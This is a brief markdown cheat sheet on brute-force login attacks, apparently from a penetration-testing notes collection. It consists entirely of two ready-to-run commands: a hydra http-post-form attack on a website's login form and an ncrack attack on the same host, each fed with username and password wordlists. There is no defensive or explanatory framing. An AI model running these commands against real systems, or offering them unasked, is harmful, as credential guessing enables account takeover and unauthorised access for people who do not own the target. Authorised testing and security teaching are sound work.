# Brute force attacks

## With hydra

```console
hydra website.com http-post-form "/:login=^USER^&password=^PASS^:F=Wrong" -L logins.txt -P passwords.txt
```

## With ncrack

```console
ncrack website.com -g path=/directory -U logins.txt -P passwords.txt
```
